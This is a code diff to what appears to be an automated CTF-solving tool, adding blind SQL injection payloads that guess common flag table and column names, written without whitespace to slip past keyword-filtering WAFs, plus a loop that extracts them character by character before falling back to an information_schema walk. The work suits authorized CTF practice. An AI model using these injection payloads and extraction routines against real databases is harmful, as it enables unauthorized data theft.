@@ -87,6 +87,25 @@ _BLIND_TABLES_EXPR = (
     "select(group_concat(table_name))from(information_schema.tables)"
     "where(table_schema=database())"
 )
+# CTF flag rows overwhelmingly live in an obviously-named table/column. Probing
+# these directly reaches the flag in a single short extraction and side-steps the
+# ``information_schema`` walk, which group_concats *every* table (capped at
+# ``_BLIND_MAX_STR_LEN`` and ordered by storage): on a large shared database such
+# as BUUCTF's ``ctftraining`` the ``flag`` table falls outside the extracted
+# window and the walk exhausts its request budget before ever reaching it. Each
+# expression is a self-contained, whitespace-free scalar sub-select (``from(x)``
+# parenthesised in place of a space) so it survives a space/keyword-blacklisting
+# WAF; a non-existent table/column errors the sub-query, the length probe returns
+# 0 (a handful of requests), and the next candidate is tried.
+_BLIND_DIRECT_FLAG_EXPRS = (
+    "select(group_concat(flag))from(flag)",
+    "select(group_concat(flag))from(flags)",
+    "select(group_concat(flag))from(ctf)",
+    "select(group_concat(value))from(flag)",
+    "select(group_concat(content))from(flag)",
+    "select(group_concat(flag))from(secret)",
+    "select(group_concat(secret))from(secret)",
+)
 
 # ---------------------------------------------------------------------------
 # Second-order SQLi: plant in one request, trigger in a later one
@@ -857,9 +876,13 @@ class SQLiExecutorMixin:
         ``substr``/``mid`` + ``ascii``/``ord`` alternates), establishes a page-diff
         oracle, then reconstructs data one
         character at a time — needing neither a reflected UNION column nor an
-        external binary. Bounded schema walk: ``database()`` (also calibrating the
-        function flavour) -> ``information_schema`` tables -> columns -> row blob,
-        flag-scanning every reconstructed string. A hard request budget caps cost;
+        external binary. Extraction order: ``database()`` (also calibrating the
+        function flavour) -> a CTF fast-path over the obvious flag locations
+        (``flag``.``flag`` etc.) -> a bounded ``information_schema`` walk (tables
+        -> columns -> row blob) as the fallback, flag-scanning every reconstructed
+        string. The fast-path is what reaches a HackWorld-class ``flag`` table
+        inside the request budget on a large shared database where the generic
+        walk would truncate and run dry first. A hard request budget caps cost;
         the cheap oracle phase bails fast on non-blind targets.
         """
         self.tool_guard.require(["http_request"])
@@ -914,6 +937,19 @@ class SQLiExecutorMixin:
         if db:
             reasons.append(f"current database='{db}'")
             if hit := await self._blind_scan_for_flag(target, db, "database()"):
+                return hit
+
+        # CTF fast-path: try the obvious flag locations directly before the
+        # expensive, truncation-prone information_schema walk. This reaches a
+        # ``flag``.``flag`` row (HackWorld-class) inside the request budget even on
+        # a large shared database where the generic walk would run dry first.
+        for expr in _BLIND_DIRECT_FLAG_EXPRS:
+            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
+                break
+            direct_blob = await self._blind_extract_string(oracle, expr, budget)
+            if direct_blob:
+                reasons.append("probed direct flag location")
+            if hit := await self._blind_scan_for_flag(target, direct_blob, "direct flag location"):
                 return hit
 
         # Bounded schema walk: tables -> per-table columns -> row blob.
